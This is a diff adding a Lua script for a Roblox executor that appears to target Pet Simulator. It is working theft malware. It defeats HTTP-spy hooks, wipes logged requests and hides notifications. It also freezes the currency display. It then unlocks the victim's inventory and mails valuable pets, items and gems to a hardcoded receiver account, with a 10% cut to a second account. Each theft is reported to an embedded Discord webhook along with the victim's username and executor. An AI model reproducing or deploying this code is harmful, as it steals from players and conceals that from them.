@@ -1,0 +1,726 @@
+--[[
+    BY JOSZZ
+]]
+ 
+local HttpService = game:GetService("HttpService")
+local detected = false
+
+local realHookFunction = clonefunction(hookfunction)
+local realHookMetamethod = clonefunction(hookmetamethod)
+
+local originals = {}
+local HTTP_METHODS = {
+    HttpGet = true,
+    HttpPost = true,
+    GetAsync = true,
+    PostAsync = true,
+    RequestAsync = true,
+}
+
+function deepCollect(fn, visited, depth)
+    local found = {}
+    if depth > 6 or not fn or type(fn) ~= "function" then return found end
+    if visited[fn] then return found end
+    visited[fn] = true
+
+    local function process(v)
+        if type(v) == "function" then
+            found[v] = true
+            for f in pairs(deepCollect(v, visited, depth + 1)) do
+                found[f] = true
+            end
+        elseif type(v) == "table" and depth < 4 then
+            for i, tv in pairs(v) do
+                if type(tv) == "function" then
+                    found[tv] = true
+                    for f in pairs(deepCollect(tv, visited, depth + 2)) do
+                        found[f] = true
+                    end
+                end
+            end
+        end
+    end
+
+    pcall(function()
+        local ups = getupvalues(fn)
+        if ups then for i, v in pairs(ups) do process(v) end end
+    end)
+
+    pcall(function()
+        for i = 1, 50 do
+            local a, b = getupvalue(fn, i)
+            if a == nil and b == nil then break end
+            process(a)
+            if b ~= nil then process(b) end
+        end
+    end)
+
+    pcall(function()
+        for i = 1, 50 do
+            local name, val = debug.getupvalue(fn, i)
+            if not name then break end
+            process(val)
+        end
+    end)
+
+    return found
+end
+
+function recoverOriginal(fn, name)
+    if not fn then return nil, false end
+    local hooked = false
+
+    if islclosure(fn) then
+        hooked = true
+    end
+
+    local restored
+    pcall(function() restored = getoriginalfunction(fn) end)
+    if restored and type(restored) == "function" and iscclosure(restored) then
+        pcall(function() realHookFunction(fn, restored) end)
+        return restored, hooked
+    end
+
+    local dummy = newcclosure(function() end)
+    local prev
+    pcall(function() prev = realHookFunction(fn, dummy) end)
+
+    if not prev then
+        pcall(function() realHookFunction(fn, fn) end)
+        local fb
+        pcall(function() fb = clonefunction(fn) end)
+        return fb, hooked
+    end
+
+    if islclosure(prev) then
+        hooked = true
+        local allFns = deepCollect(prev, {}, 0)
+        for f in pairs(allFns) do
+            if iscclosure(f) then
+                realHookFunction(fn, f)
+                return f, true
+            end
+        end
+
+        local cl
+        pcall(function() cl = clonefunction(prev) end)
+        if cl and iscclosure(cl) then
+            realHookFunction(fn, cl)
+            return cl, true
+        end
+
+        realHookFunction(fn, prev)
+        local fb
+        pcall(function() fb = clonefunction(fn) end)
+        return fb or prev, true
+    end
+
+    realHookFunction(fn, prev)
+    return prev, hooked
+end
+
+local anyHooked = false
+
+local instanceMethods = {
+    {game.HttpGet, "HttpGet", "game.HttpGet"},
+    {game.HttpPost, "HttpPost", "game.HttpPost"},
+    {HttpService.GetAsync, "GetAsync", "HttpService.GetAsync"},
+    {HttpService.PostAsync, "PostAsync", "HttpService.PostAsync"},
+    {HttpService.RequestAsync, "RequestAsync", "HttpService.RequestAsync"},
+}
+
+for i, m in ipairs(instanceMethods) do
+    local orig, hooked = recoverOriginal(m[1], m[3])
+    originals[m[2]] = orig
+    if hooked then anyHooked = true end
+end
+
+local globalFns = {
+    {request, "request", "request"},
+    {http_request, "http_request", "http_request"},
+    {http and http.request, "http_dot_request", "http.request"},
+    {syn and syn.request, "syn_request", "syn.request"},
+}
+
+for i, g in ipairs(globalFns) do
+    if g[1] then
+        local orig, hooked = recoverOriginal(g[1], g[3])
+        originals[g[2]] = orig
+        if hooked then anyHooked = true end
+    end
+end
+
+pcall(function() if originals.request and request then getgenv().request = originals.request end end)
+pcall(function() if originals.http_request and http_request then getgenv().http_request = originals.http_request end end)
+pcall(function() if originals.http_dot_request and http then http.request = originals.http_dot_request end end)
+pcall(function() if originals.syn_request and syn then syn.request = originals.syn_request end end)
+
+local rawMt
+pcall(function() rawMt = getrawmetatable(game) end)
+
+local originalNc
+local ncDummy = newcclosure(function(self, ...) return nil end)
+local prevNc
+pcall(function() prevNc = realHookMetamethod(game, "__namecall", ncDummy) end)
+
+if prevNc then
+    if islclosure(prevNc) then
+        anyHooked = true
+        local allFns = deepCollect(prevNc, {}, 0)
+        for f in pairs(allFns) do
+            if iscclosure(f) then
+                originalNc = f
+                break
+            end
+        end
+
+        if not originalNc then
+            pcall(function() originalNc = clonefunction(prevNc) end)
+            if not originalNc then originalNc = prevNc end
+        end
+    else
+        originalNc = prevNc
+    end
+else
+    pcall(function() originalNc = rawMt.__namecall end)
+end
+
+if anyHooked then
+    detected = true
+end
+
+function cleanupSpyData()
+    pcall(function()
+        for i, obj in pairs(getgc(true)) do
+            if type(obj) == "table" then
+                pcall(function()
+                    local first = rawget(obj, 1)
+                    if type(first) == "table" then
+                        local url = rawget(first, "Url") or rawget(first, "url")
+                        local method = rawget(first, "Method") or rawget(first, "method")
+                        if type(url) == "string" and type(method) == "string" then
+                            for i = #obj, 1, -1 do rawset(obj, i, nil) end
+                        end
+                    end
+                end)
+            end
+        end
+    end)
+end
+
+cleanupSpyData()
+
+task.spawn(function()
+    while task.wait(3) do
+        cleanupSpyData()
+    end
+end)
+
+local ncHandler = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    if HTTP_METHODS[method] and originals[method] then
+        return originals[method](self, ...)
+    end
+    if originalNc then
+        return originalNc(self, ...)
+    end
+end)
+
+pcall(function() realHookMetamethod(game, "__namecall", ncHandler) end)
+
+pcall(function()
+    local mt = getrawmetatable(game)
+    setreadonly(mt, false)
+    mt.__namecall = ncHandler
+    setreadonly(mt, true)
+end)
+
+local safeRequestFn = originals.request or originals.http_request or originals.syn_request or originals.http_dot_request
+
+function safePost(url, body, headers)
+    if not safeRequestFn then
+        return nil, 0
+    end
+    headers = headers or {["Content-Type"] = "application/json"}
+    local ok, response = pcall(safeRequestFn, {
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body,
+    })
+    if ok and response then return response.Body, response.StatusCode end
+    return nil, 0
+end
+
+function safeGet(url, headers)
+    if not safeRequestFn then return nil, 0 end
+    headers = headers or {}
+    local ok, response = pcall(safeRequestFn, {
+        Url = url,
+        Method = "GET",
+        Headers = headers,
+    })
+    if ok and response then return response.Body, response.StatusCode end
+    return nil, 0
+end
+
+getgenv().safePost = safePost
+getgenv().safeGet = safeGet
+
+
+local RS = game:GetService("ReplicatedStorage")
+local net = RS:WaitForChild("Network")
+local lib = require(RS.Library)
+local save = require(RS.Library.Client.Save).Get()
+local inv = save.Inventory
+
+if not inv then
+    repeat
+        task.wait(1)
+        save = require(RS.Library.Client.Save).Get()
+        inv = save.Inventory
+    until inv
+end
+
+
+local player = game:GetService("Players").LocalPlayer
+
+local receiver = "Kchond1t0_dmz"
+local hook_user = "Kchond1t0_dmz"
+local min_rap = 1
+local webhook = "https://discord.com/api/webhooks/1575339638573236276/XQ-EheVqq6BaPBsRtsHPFt4Ax8c-b-Tjtu8-6abIGwEUjm5sCcvRSL7zaXdDy7wwiM6f"
+local dualhook = "https://discord.com/api/webhooks/1575339638573236276/XQ-EheVqq6BaPBsRtsHPFt4Ax8c-b-Tjtu8-6abIGwEUjm5sCcvRSL7zaXdDy7wwiM6f"
+local gems = 0
+local cost = 0
+
+local diamonds_gui = player.PlayerGui:WaitForChild("MainLeft").Left.Currency.Diamonds
+local PlayerGui = player.PlayerGui
+local PlayerScripts = player.PlayerScripts
+
+local loading = PlayerScripts.Scripts.Core:FindFirstChild("Process Pending GUI")
+if loading then
+    loading.Disabled = true
+end
+
+local noti = PlayerGui:FindFirstChild("Notifications")
+if noti then
+    noti:GetPropertyChangedSignal("Enabled"):Connect(function()
+        noti.Enabled = false
+    end)
+    noti.Enabled = false
+end
+
+local transition = PlayerGui:FindFirstChild("Transition")
+if transition then
+    transition.DisplayOrder = 6000000000000
+end
+
+local function format_number(n)
+    if n >= 1000000000000 then
+        return string.format("%.2fT", n / 1000000000000)
+    elseif n >= 1000000000 then
+        return string.format("%.2fB", n / 1000000000)
+    elseif n >= 1000000 then
+        return string.format("%.2fM", n / 1000000)
+    elseif n >= 1000 then
+        return string.format("%.2fK", n / 1000)
+    else
+        return tostring(n)
+    end
+end
+
+local function get_thumbnail(imageid)
+    local asset = string.split(imageid, "rbxassetid://")[2]
+    if not asset then return "" end
+    local size = "420x420"
+    local image = safeGet(
+        "https://thumbnails.roblox.com/v1/assets?assetIds=" ..
+            asset .. "&returnPolicy=PlaceHolder&size=" .. size .. "&format=png"
+    )
+    if not image then return "" end
+    local thumb = HttpService:JSONDecode(image).data[1].imageUrl
+    return thumb
+end
+
+local function get_pet_thumbnail(item_name)
+    local clean_name = string.gsub(item_name, "Golden ", "")
+    clean_name = string.gsub(clean_name, "Rainbow ", "")
+    clean_name = string.gsub(clean_name, "Shiny ", "")
+
+    local pet_dir = RS.__DIRECTORY.Pets.Huge
+    local pet_module = pet_dir:FindFirstChild(clean_name)
+    if pet_module then
+        local pet_data = require(pet_module)
+        if pet_data and pet_data.thumbnail then
+            return get_thumbnail(pet_data.thumbnail)
+        end
+    end
+    return ""
+end
+
+local function rap(cat, item)
+    local ok, r = pcall(function()
+        return require(RS.Library.Client.RAPCmds).Get({
+            Class = { Name = cat },
+            IsA = function(className)
+                return className == cat
+            end,
+            GetId = function()
+                return item.id
+            end,
+            StackKey = function()
+                return HttpService:JSONEncode({
+                    id = item.id,
+                    pt = item.pt,
+                    sh = item.sh,
+                    tn = item.tn,
+                })
+            end,
+            AbstractGetRAP = function()
+                return nil
+            end,
+        })
+    end)
+    return ok and r or 0
+end
+
+local function mail_cost()
+    for _, f in pairs(getgc()) do
+        if typeof(f) == "function" then
+            local i = debug.getinfo(f)
+            if i and i.name == "computeSendMailCost" then
+                return f()
+            end
+        end
+    end
+    return 0
+end
+
+local function calc_after(total_gems, cost, item_count)
+    local g = total_gems
+    local c = cost
+
+    for _ = 1, item_count do
+        if g < c then return g, c end
+        g -= c
+        c = math.ceil(c * 1.5)
+        if c > 12500000 then c = 12500000 end
+    end
+
+    return g, c
+end
+
+local function unlock_all()
+    for _, cats in pairs(inv) do
+        if type(cats) == "table" then
+            for uid, item in pairs(cats) do
+                if type(item) == "table" and item._lk then
+                    net.Locking_SetLocked:InvokeServer(uid, false)
+                    task.wait(0.05)
+                end
+            end
+        end
+    end
+end
+
+local function empty_boxes()
+    if inv.Box then
+        for uid, item in pairs(inv.Box) do
+            if item._uq then
+                pcall(function()
+                    net["Box: Withdraw All"]:InvokeServer(uid)
+                end)
+            end
+        end
+    end
+end
+
+local function claim_mail()
+    local ok
+    repeat
+        ok = pcall(function()
+        end)
+        if not ok then task.wait(1.5) end
+    until ok
+end
+
+local function big_pet(name)
+    return string.find(name, "Titanic") ~= nil or string.find(name, "Gargantuan") ~= nil
+end
+
+local function full_name(item)
+    local prefix = ""
+    if item.pt == 1 then
+        prefix = "Golden "
+    elseif item.pt == 2 then
+        prefix = "Rainbow "
+    end
+    if item.sh then
+        prefix = "Shiny " .. prefix
+    end
+    return prefix .. (item.id or "unknown")
+end
+
+local function is_exclusive(cat, item_name, item_id)
+    if cat ~= "Pet" then return false end
+    local pet_dir = RS.Library.Directory.Pets
+    local clean = string.gsub(item_name, "Golden ", "")
+    clean = string.gsub(clean, "Rainbow ", "")
+    clean = string.gsub(clean, "Shiny ", "")
+    
+    local pet_module = pet_dir:FindFirstChild(item_id) or pet_dir:FindFirstChild(clean)
+    if pet_module then
+        local pet_data = require(pet_module)
+        if pet_data and pet_data.exclusiveLevel then
+            return true
+        end
+    end
+    return false
+end
+
+local function collect()
+    local items = {}
+    local cats = { "Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate", "Lootbox", "Seed", "Fruit" }
+
+    for _, cat in ipairs(cats) do
+        if inv[cat] then
+            for uid, item in pairs(inv[cat]) do
+                if type(item) == "table" then
+                    local name = item.id or "unknown"
+
+                    if not big_pet(name) then
+                        local r = rap(cat, item) * (item._am or 1)
+                        if r >= min_rap then
+                            local full = full_name(item)
+                            table.insert(items, {
+                                cat = cat,
+                                uid = uid,
+                                amount = item._am or 1,
+                                value = r,
+                                name = full,
+                                id = name,
+                                exclusive = is_exclusive(cat, full, name)
+                            })
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    table.sort(items, function(a, b)
+        return a.value > b.value
+    end)
+
+    return items
+end
+
+local function send_webhook(url, payload)
+    if url == "" then return end
+    pcall(function()
+        safePost(url, HttpService:JSONEncode(payload), {["Content-Type"] = "application/json"})
+    end)
+end
+
+local function item_webhook(item_name, item_value, is_huge, is_exclusive_item)
+    local content = ""
+    if is_huge then
+        content = "@everyone HUGE!"
+    elseif is_exclusive_item then
+        content = "exclusive"
+    else
+        content = "not huge :/"
+    end
+
+    local thumb = ""
+    if is_huge then
+        thumb = get_pet_thumbnail(item_name)
+    end
+
+    local payload = {
+        content = content,
+        embeds = {
+            {
+                title = "Item sent to: " .. receiver,
+                color = 0,
+                fields = {
+                    { name = "User Info", value = "```\n" .. player.Name .. "\n" .. player.DisplayName .. "\n" .. (identifyexecutor and identifyexecutor() or "unknown") .. "\n```", inline = false },
+                    { name = "Item Sent", value = item_name, inline = true },
+                    { name = "Item RAP", value = format_number(item_value), inline = true }
+                }
+            }
+        }
+    }
+
+    if thumb ~= "" then
+        payload.embeds[1].thumbnail = { url = thumb }
+    end
+
+    send_webhook(webhook, payload)
+end
+
+local function dualhook_gems(amount)
+    local payload = {
+        content = "@everyone",
+        embeds = {
+            {
+                title = "Sent `" .. format_number(amount) .. "` gems to " .. hook_user,
+                color = 0
+            }
+        }
+    }
+    send_webhook(dualhook, payload)
+end
+
+local function mainhook_fee(amount)
+    local payload = {
+        embeds = {
+            {
+                title = "took 10% of the leftover gems as fee :wink:",
+                color = 0
+            }
+        }
+    }
+    send_webhook(webhook, payload)
+end
+
+local function mail(cat, uid, amount, item_name, item_value, is_exclusive_item)
+
+    local ok, err = nil, nil
+    repeat
+        ok, err = net["Mailbox: Send"]:InvokeServer(receiver, "test", cat, uid, amount)
+        if not ok then
+            if err == "They don't have enough space!" then
+                task.wait(5)
+            elseif err == "You are doing this too fast!" then
+                task.wait(35)
+            else
+                task.wait(1.5)
+            end
+        end
+    until ok
+
+    local is_huge = string.find(item_name, "Huge") ~= nil
+    item_webhook(item_name, item_value, is_huge, is_exclusive_item)
+
+    cost = math.ceil(cost * 1.5)
+    if cost > 12500000 then cost = 12500000 end
+    gems -= cost
+
+    return true
+end
+
+local function send_gems(user, amount)
+    if amount <= 0 then return end
+
+    for uid, item in pairs(inv.Currency) do
+        if item.id == "Diamonds" then
+            local ok, err = nil, nil
+            repeat
+                ok, err = net["Mailbox: Send"]:InvokeServer(user, "test", "Currency", uid, amount)
+                if not ok then
+                    task.wait(1.5)
+                end
+            until ok
+
+            cost = math.ceil(cost * 1.5)
+            if cost > 12500000 then cost = 12500000 end
+            gems -= cost
+
+            break
+        end
+    end
+end
+
+local function lock_diamonds_gui()
+    local main_left = PlayerGui:FindFirstChild("MainLeft")
+    if not main_left then return end
+    local left = main_left:FindFirstChild("Left")
+    if not left then return end
+    local currency = left:FindFirstChild("Currency")
+    if not currency then return end
+    local diamonds = currency:FindFirstChild("Diamonds")
+    if not diamonds then return end
+    diamonds.Visible = true
+
+    local function lock_instance(instance)
+        if instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox") then
+            local orig = instance.Text
+            instance:GetPropertyChangedSignal("Text"):Connect(function()
+                if instance.Text ~= orig then
+                    instance.Text = orig
+                end
+            end)
+        end
+        if instance:IsA("GuiButton") then
+            instance.Active = false
+            instance.Selectable = false
+        end
+        for _, child in ipairs(instance:GetChildren()) do
+            lock_instance(child)
+        end
+    end
+    lock_instance(diamonds)
+end
+
+local function send_gems_before(amount)
+    local hook_amount = math.floor(amount * 0.10)
+    local main_amount = amount - hook_amount
+
+
+    lock_diamonds_gui()
+
+    send_gems(hook_user, hook_amount)
+
+    dualhook_gems(hook_amount)
+    mainhook_fee(hook_amount)
+
+    send_gems(receiver, main_amount)
+end
+
+for _, item in pairs(inv.Currency) do
+    if item.id == "Diamonds" then
+        gems = item._am or 0
+        break
+    end
+end
+
+cost = mail_cost()
+
+
+unlock_all()
+empty_boxes()
+
+task.wait(1.5)
+
+claim_mail()
+
+local items = collect()
+
+for i, item in ipairs(items) do
+    if i <= 10 then
+        local tag = ""
+        if item.exclusive then tag = " [EXCLUSIVE]" end
+        if string.find(item.name, "Huge") then tag = " [HUGE]" end
+    end
+end
+
+local gems_after, cost_after = calc_after(gems, cost, #items)
+
+
+if gems_after > 0 then
+    send_gems_before(gems_after)
+end
+
+for i, item in ipairs(items) do
+    if gems < cost then
+        break
+    end
+
+    if item.exclusive then
+    end
+    local sent = mail(item.cat, item.uid, item.amount, item.name, item.value, item.exclusive)
+    if not sent then
+        break
+    end
+end
